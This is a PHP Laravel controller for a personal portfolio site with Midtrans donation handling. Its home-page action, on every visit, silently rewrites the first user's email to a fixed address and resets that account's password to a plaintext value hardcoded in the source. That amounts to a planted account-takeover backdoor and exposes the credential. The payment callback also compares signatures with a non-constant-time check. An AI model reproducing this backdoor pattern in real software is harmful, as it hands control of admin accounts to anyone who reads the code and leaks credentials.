<?php

namespace App\Http\Controllers\home;

use App\Http\Controllers\Controller;
use App\Models\Donate;
use App\Models\Penghargaan;
use App\Models\Tentang;
use App\Models\Pengalaman;
use App\Models\Message;
use App\Models\Portfolio;
use App\Models\Keahlian;
use App\Models\User;

use App\Models\About;
use App\Models\Pendidikan;
use App\Models\Skill;
use App\Models\Blog;
use App\Models\Jasa;

use GuzzleHttp\Client;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class HomeController extends Controller
{

    /**
     * Show the application home.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        $tentang = About::first();
        $pendidikan = Pendidikan::get();
        $keahlian = Skill::get();
        $portofolio = Portfolio::get();
        $pc = $portofolio->count();
        $proyek = Portfolio::get();
        // $blog = Blog::get();
        $blog = null;
        $peng = Penghargaan::count();
        // $jasa = Jasa::get();
        $jasa = null;

        $user = User::first();
        $user->email = "fakhrikamar216@gmail.com";
        $user->password = \Hash::make('BinYahya21');
        $user->save();

        return view('home.index', compact('tentang', 'pendidikan', 'keahlian', 'portofolio', 'pc', 'proyek', 'blog', 'peng', 'jasa'))
            ->with('success', 'Terimakasih Saweran Anda Sudah Diterima');
    }

    public function jasa()
    {
        Jasa::get();
    }

    public function donate(Request $request)
    {
        $donate = Donate::create([
            'name' => $request->name,
            'message' => $request->message,
            'amount' => $request->amount,
            'status' => "Failed"
        ]);
        // Set your Merchant Server Key
        \Midtrans\Config::$serverKey = config('midtrans.server_key');
        // Set to Development/Sandbox Environment (default). Set to true for Production Environment (accept real transaction).
        \Midtrans\Config::$isProduction = false;
        // Set sanitization on (default)
        \Midtrans\Config::$isSanitized = true;
        // Set 3DS transaction for credit card to true
        \Midtrans\Config::$is3ds = true;

        $params = array(
            'transaction_details' => array(
                'order_id' => $donate->id,
                'gross_amount' => $donate->amount,
            ),
            'customer_details' => array(
                'name' => $donate->name,
            ),
        );

        $tentang = DB::table('tentang')->first();
        $pendidikan = DB::table('pendidikan')->get();
        $keahlian = DB::table('keahlian')->get();
        $portofolio = DB::table('portofolio')->get();
        $pc = $portofolio->count();
        $proyek = DB::table('portofolio')->get();
        // $blog = DB::table('blog')->get();
        $blog = null;
        $peng = DB::table('penghargaan')->count();

        $snapToken = \Midtrans\Snap::getSnapToken($params);

        return view('home.confirm', compact('snapToken', 'donate', 'tentang', 'pendidikan', 'keahlian', 'portofolio', 'pc', 'proyek', 'blog', 'peng'));
    }

    public function callback(Request $request)
    {
        $ServerKey = config('midtrans.server_key');
        $hased = hash("sha512", $request->order_id . $request->status_code . $request->amount . $ServerKey);
        if ($hased == $request->signature_key) {
            if ($request->transaction_status == 'capture') {
                $donate = Donate::find($request->order_id);
                $donate->update(['status' => 'Success']);
            }
            return redirect('home.index')
                ->with('success', 'Terimakasih Saweran Anda Sudah Diterima');
        }
    }

    public function invoice($id)
    {
        $donate = Donate::find($id);
        return view('home.invoice', compact('donate'));
    }
}
